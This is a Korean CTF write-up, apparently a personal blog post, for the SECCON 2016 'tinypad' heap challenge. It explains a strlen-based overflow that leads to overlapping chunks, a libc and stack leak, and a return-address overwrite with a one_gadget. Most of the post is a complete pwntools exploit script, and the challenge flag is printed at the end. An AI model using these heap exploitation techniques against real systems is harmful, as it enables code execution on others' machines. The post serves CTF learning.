---
layout: post
title: "[2016 seccon-ctf] tinypad 풀이"
date: 2018-09-27 04:44
categories: "[Pwn]CTF"
tags: rotles98
---

>### Host : tinypad.pwn.seccon.jp Port : 57463
### Heap Fun as a Service!
### [tinypad](https://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf/raw/be9fb6843480f5dbe2538f1366b4709330fa390e/tinypad-0e6d01f582e5d8f00283f02d2281cc2c661eba72) (SHA1 : 0e6d01f582e5d8f00283f02d2281cc2c661eba72) [libc-2.19.so](https://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf/raw/be9fb6843480f5dbe2538f1366b4709330fa390e/libc-2.19.so-8674307c6c294e2f710def8c57925a50e60ee69e) (SHA1 : 8674307c6c294e2f710def8c57925a50e60ee69e)

분명 최근에 풀었는데 기억이 안나요.

- - -
# 0x00. 분석

{: refdef: style="text-align: center;"}
![checksec](/img/2016_seccon-ctf/tinypad/01.png)
{: refdef}

`libc_leak`은 따로 말 안해도 될 정도로 쉬우니까 스킵

그리고 `func_edit`에서 `read` 할 길이를 `strlen`으로 정해서 만약 `chunk`를 꽉 채워서 다음 `chunk`의 `size`까지 연결되면 그 값을 바꿀 수 있어요.

이걸로 `overlapping_chunks`을 해서 다른 `chunk`의 값을 마음대로 바꿀 수 있어요.

- - -
# 0x01. 공격 방법

위에서 말했듯 다른 `chunk`의 값을 바꿀 수 있어요.

이걸 어떻게 사용하느냐인데...

`PIE`가 안 걸려있어서 다른 `chunk`가 **bss**에 존재하도록 할 수 있어요.

그리고 `해당 chunk`를 `edit`해서 **bss**의 `tinypad`의 값을 바꿀 수 있고

그걸로 `libc_environ`을 출력하면 `stack_leak`이고 이걸로 어찌어찌해서 `ret`의 값을 바꿀 수 있어요.

그럼 그 값을 `one_gadget`으로 바꿔주면 풀려요.

- - -
# 0x02. 익스플로잇

`writeup`이 많은 문제는 왠지 모르게 자세히 쓰기 싫음

```python
from pwn import *
#context.log_level = "debug"

HOST = "192.168.0.19"
#HOST = "tinypad.pwn.seccon.jp"
PORT = 4444
#PORT = 57463

s = remote(HOST, PORT)
pause()

elf = ELF("./tinypad")
libc = ELF("./libc.so.6")

free_got = elf.got["free"]

libc_off = 0x3c4b78
one_off = 0xf1147
environ_off = libc.symbols["environ"]

bss_base = 0x602040

stack_ret_off = -0xf0

def func_add(content):
    s.recvuntil("(CMD)>>> ")
    s.sendline("A")

    s.recvuntil("(SIZE)>>> ")
    s.sendline(str(len(content)))

    s.recvuntil("(CONTENT)>>> ")
    s.sendline(content)

def func_delete(index):
    s.recvuntil("(CMD)>>> ")
    s.sendline("D")

    s.recvuntil("(INDEX)>>> ")
    s.sendline(str(index))

def func_edit(index, content):
    s.recvuntil("(CMD)>>> ")
    s.sendline("E")

    s.recvuntil("(INDEX)>>> ")
    s.sendline(str(index))

    s.recvuntil("(CONTENT)>>> ")
    s.sendline(content)

    s.sendline("Y")

def send_null(index, content):
    payload = ""
    length = len(content)

    for i in range(length):
        j = length - i - 1

        if(content[j] == "\x00"):
            if(payload != ""):
                func_edit(index, "B" * (j + 1) + payload)
            func_edit(index, "B" * j + "\x00")
            payload = ""
        else:
            payload = content[j] + payload

    if(payload != ""):
        func_edit(index, payload)

# libc_leak
func_add("B\n".ljust(0x88, "B")) # 1
func_add("B\n".ljust(0x88, "B")) # 2

func_delete(1)
func_delete(2)
s.recvuntil("INDEX: 1\n")
s.recvuntil("CONTENT: ")
libc_leak = u64(s.recvuntil("\x7f").ljust(0x8, "\x00"))

libc_base = libc_leak - libc_off
libc_one = libc_base + one_off
libc_environ = libc_base + environ_off

print
log.info("libc_base : " + hex(libc_base))
log.info("libc_one : " + hex(libc_one))
log.info("libc_environ : " + hex(libc_environ))
print

func_add("B" * 0x28) # 1
func_add("B" * 0x18) # 2
func_add("B" * 0x18) # 3
func_add("B" * 0x28) # 4
func_edit(1, "B" * 0x28 + "\x71")
func_delete(2)
func_delete(3)

func_add("B" * 0x68) # 2
payload = "B" * 0x18
payload += p64(0x21) # 3 size
payload += p64(bss_base + 0x108 - 0x10) # 3 fd
payload += "B" * 0x10
payload += p64(0x31) # 4 size
send_null(2, payload.ljust(0x67, "B"))

func_delete(2)
func_add("B" * 0x17) # 2
send_null(2, "/bin/sh\0")

# stack_leak
func_add(p64(libc_environ)) # 3
s.recvuntil("INDEX: 1\n")
s.recvuntil("CONTENT: ")
stack_leak = u64(s.recvuntil("\x7f").ljust(0x8, "\x00"))

stack_ret = stack_leak + stack_ret_off

log.info("stack_leak : " + hex(stack_leak))
log.info("stack_ret : " + hex(stack_ret))
print

func_edit(3, p64(stack_ret))
func_edit(1, p64(libc_one))

s.recvuntil("(CMD)>>> ")
s.sendline("Q")

s.interactive()
```

### SECCON{5m45h1n9_7h3_574ck_f0r_fun_4nd_p40f17_w1th_H0u53_0f_31nh3rj4r}
